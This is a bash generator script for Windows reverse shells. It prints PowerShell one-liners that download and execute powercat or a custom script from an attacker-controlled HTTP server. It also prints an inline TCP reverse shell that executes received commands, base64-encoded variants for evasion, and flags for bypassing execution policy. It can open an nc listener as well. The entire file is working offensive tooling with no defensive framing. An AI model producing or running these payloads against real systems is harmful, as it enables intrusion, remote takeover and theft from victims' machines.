#!/bin/bash

# Check for correct number of arguments
if [ "$#" -lt 2 ]; then
    echo "Usage: $0 <lhost> <lport> [-l]"
    exit 1
fi

ip=$1
port=$2
listen_flag=0

# Check for '-l' argument
if [ "$#" -eq 3 ] && [ "$3" == "-l" ]; then
    listen_flag=1
fi

powercat="IEX(New-Object System.Net.WebClient).DownloadString('http://$ip:8000/powercat.ps1');powercat -c $ip -p $port -e powershell"
shell="\$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"

invoke_ps="powershell -nop -noni -ep bypass" # Add "-w hidden" to hide the window (can break powercat in cmd)

# Cradles
echo -e "\n<== powercat ==>\n"
echo -e "$invoke_ps -c \"$powercat\"\n"
echo "$invoke_ps -e $(echo $powercat | iconv -t utf-16le | base64 -w 0)"

echo -e "\n<== Custom IEX ==>\n"
echo "$invoke_ps -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://$ip:8000/hehe.ps1')\""

echo -e "\nhehe.ps1:\n"
echo "powershell -e $(echo $shell | iconv -t utf-16le | base64 -w 0)"

echo -e "\n<== Direct invocation (only works in cmd) ==>\n"
echo "$invoke_ps -c \"$shell\""

echo -e "\n<== Direct encoded invocation ==>\n"
echo "$invoke_ps -e $(echo $shell | iconv -t utf-16le | base64 -w 0)"

# Listener
if [ "$listen_flag" -eq 1 ]; then
    echo -e "\n  <===============================================================================================================>  \n"
    rlwrap -crA nc -lvnp $port
fi
